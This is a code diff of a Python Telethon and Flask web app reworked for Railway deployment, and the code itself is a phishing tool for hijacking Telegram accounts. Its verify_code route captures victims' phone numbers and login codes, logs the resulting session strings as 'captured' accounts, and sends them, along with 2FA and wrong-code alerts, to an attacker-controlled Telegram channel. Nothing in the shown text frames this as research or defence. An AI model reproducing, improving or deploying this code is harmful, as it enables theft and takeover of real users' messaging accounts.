@@ -7,15 +7,11 @@ from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 from flask import Flask, request, jsonify, render_template_string
 
-# --- RAILWAY FIX: Load from environment variables ---
+# RAILWAY CHANGE: Load from environment variables instead of config.py
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHANNEL_ID = os.environ.get("CHANNEL_ID")
-
-if not API_ID or not API_HASH or not BOT_TOKEN:
-    print("ERROR: Missing API_ID, API_HASH, or BOT_TOKEN environment variables.")
-    exit(1)
+CHANNEL_ID = os.environ.get("CHANNEL_ID")  # For Telegram logging
 
 print("=" * 50)
 print("SCRIPT STARTING...")
@@ -29,8 +25,8 @@ bot_client = TelegramClient('bot_session', API_ID, API_HASH)
 # Store for sessions
 active_sessions = {}
 
+# RAILWAY CHANGE: Function to send logs to Telegram channel (replaces file logging)
 async def send_to_logger(message_text):
-    """Send log message to Telegram channel."""
     if not CHANNEL_ID:
         return
     try:
@@ -482,7 +478,7 @@ def verify_code():
             print(f"\n[SUCCESS] Captured account for {phone}")
             print(f"[SUCCESS] Session String: {final_session_string}\n")
             
-            # SEND TO TELEGRAM CHANNEL
+            # RAILWAY CHANGE: Send to Telegram channel instead of files
             log_message = (
                 f"🚨 **NEW ACCOUNT CAPTURED** 🚨\n\n"
                 f"📞 Phone: `{phone}`\n"
@@ -499,7 +495,6 @@ def verify_code():
             await client.disconnect()
             print(f"[2FA] Account {phone} has 2FA enabled.")
             
-            # SEND 2FA ALERT TO TELEGRAM CHANNEL
             log_message = (
                 f"⚠️ **2FA DETECTED** ⚠️\n\n"
                 f"📞 Phone: `{phone}`\n"
@@ -514,7 +509,6 @@ def verify_code():
             await client.disconnect()
             print(f"[INVALID] Wrong code for {phone}")
             
-            # SEND INVALID CODE ALERT TO TELEGRAM CHANNEL
             log_message = (
                 f"❌ **INVALID CODE** ❌\n\n"
                 f"📞 Phone: `{phone}`\n"
@@ -613,7 +607,7 @@ if __name__ == '__main__':
     thread.daemon = True
     thread.start()
 
-    # RAILWAY FIX: Use PORT environment variable and 0.0.0.0
+    # RAILWAY CHANGE: Use PORT env var and 0.0.0.0
     port = int(os.environ.get("PORT", 5000))
     print(f"Starting web server on http://0.0.0.0:{port}")
     print("=" * 50)
